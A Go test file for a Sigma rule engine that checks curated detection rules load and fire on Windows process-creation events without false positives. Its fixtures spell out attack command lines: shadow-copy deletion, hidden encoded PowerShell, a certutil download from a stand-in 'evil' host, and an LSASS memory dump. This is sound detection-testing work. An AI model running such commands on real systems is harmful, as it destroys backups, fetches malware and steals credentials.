package sigma

import (
	"path/filepath"
	"testing"
)

// shippedRulesDir is the curated ruleset that ships with the image. A rule that
// fails to parse, or that the evaluator has to mark unsupported, is silently
// inert at runtime — so assert on it here instead of finding out during an
// incident.
const shippedRulesDir = "../../../../tools/sigma-rules"

func TestShippedRules_AllLoadAndAreSupported(t *testing.T) {
	files, err := filepath.Glob(filepath.Join(shippedRulesDir, "*.yml"))
	if err != nil {
		t.Fatal(err)
	}
	if len(files) == 0 {
		t.Fatalf("no curated rules found in %s", shippedRulesDir)
	}

	total := 0
	for _, f := range files {
		rules, err := LoadRules(f)
		if err != nil {
			t.Errorf("%s: failed to parse: %v", filepath.Base(f), err)
			continue
		}
		if len(rules) == 0 {
			t.Errorf("%s: parsed but produced no rules", filepath.Base(f))
			continue
		}
		for _, r := range rules {
			total++
			if r.Unsupported != "" {
				t.Errorf("%s: rule %q is unsupported: %s", filepath.Base(f), r.Title, r.Unsupported)
			}
			if r.Title == "" || r.Level == "" {
				t.Errorf("%s: rule %q is missing a title or level", filepath.Base(f), r.Title)
			}
			if len(r.Logsource) == 0 {
				t.Errorf("rule %q has no logsource, so it cannot be gated", r.Title)
			}
		}
	}
	if total < 10 {
		t.Errorf("expected a meaningful curated ruleset, got %d rules", total)
	}
	t.Logf("curated ruleset: %d rules across %d files", total, len(files))
}

// The curated rules must actually fire on the event shape the agent produces
// (Security 4688 field names), not just parse.
func TestShippedRules_FireOnAgentEventShape(t *testing.T) {
	e := &Engine{}
	e.LoadDirectory(shippedRulesDir)
	if e.RuleCount() == 0 {
		t.Fatal("no rules loaded from the curated directory")
	}

	cases := []struct {
		name  string
		event string
		want  string
	}{
		{
			name: "shadow copy deletion",
			event: `{"EventID":"4688","Provider":"Microsoft-Windows-Security-Auditing",
				"NewProcessName":"C:\\Windows\\System32\\vssadmin.exe",
				"ProcessCommandLine":"vssadmin.exe delete shadows /all /quiet"}`,
			want: "Volume Shadow Copies Deleted",
		},
		{
			name: "encoded powershell",
			event: `{"EventID":"4688","Provider":"Microsoft-Windows-Security-Auditing",
				"NewProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
				"ProcessCommandLine":"powershell.exe -nop -w hidden -enc SQBFAFgA"}`,
			want: "Encoded PowerShell Command Line",
		},
		{
			name: "office spawning shell",
			event: `{"EventID":"4688","Provider":"Microsoft-Windows-Security-Auditing",
				"NewProcessName":"C:\\Windows\\System32\\cmd.exe",
				"ParentProcessName":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
				"ProcessCommandLine":"cmd.exe /c certutil -urlcache -f http://evil/x.exe"}`,
			want: "Office Application Spawning a Script or Shell Host",
		},
		{
			name: "lsass dump via comsvcs",
			event: `{"EventID":"4688","Provider":"Microsoft-Windows-Security-Auditing",
				"NewProcessName":"C:\\Windows\\System32\\rundll32.exe",
				"ProcessCommandLine":"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\temp\\out.dmp full"}`,
			want: "LSASS Memory Dump via Legitimate Utility",
		},
	}

	for _, c := range cases {
		alerts, err := e.Scan(c.event)
		if err != nil {
			t.Fatalf("%s: %v", c.name, err)
		}
		found := false
		for _, a := range alerts {
			if a.RuleTitle == c.want {
				found = true
			}
		}
		if !found {
			titles := make([]string, 0, len(alerts))
			for _, a := range alerts {
				titles = append(titles, a.RuleTitle)
			}
			t.Errorf("%s: expected rule %q to fire, got %v", c.name, c.want, titles)
		}
	}
}

// A benign event must stay quiet — this is the false-positive guard.
func TestShippedRules_NoAlertsOnBenignEvents(t *testing.T) {
	e := &Engine{}
	e.LoadDirectory(shippedRulesDir)

	benign := []string{
		`{"EventID":"4688","Provider":"Microsoft-Windows-Security-Auditing",
			"NewProcessName":"C:\\Windows\\System32\\svchost.exe",
			"ParentProcessName":"C:\\Windows\\System32\\services.exe",
			"ProcessCommandLine":"svchost.exe -k netsvcs -p"}`,
		`{"EventID":"4624","Provider":"Microsoft-Windows-Security-Auditing",
			"TargetUserName":"alice","LogonType":"3"}`,
		`{"EventID":"4688","Provider":"Microsoft-Windows-Security-Auditing",
			"NewProcessName":"C:\\Program Files\\Git\\cmd\\git.exe",
			"ParentProcessName":"C:\\Windows\\System32\\cmd.exe",
			"ProcessCommandLine":"git.exe status"}`,
	}
	for i, ev := range benign {
		alerts, err := e.Scan(ev)
		if err != nil {
			t.Fatalf("benign[%d]: %v", i, err)
		}
		if len(alerts) > 0 {
			for _, a := range alerts {
				t.Errorf("benign[%d] produced a false positive: %s", i, a.RuleTitle)
			}
		}
	}
}
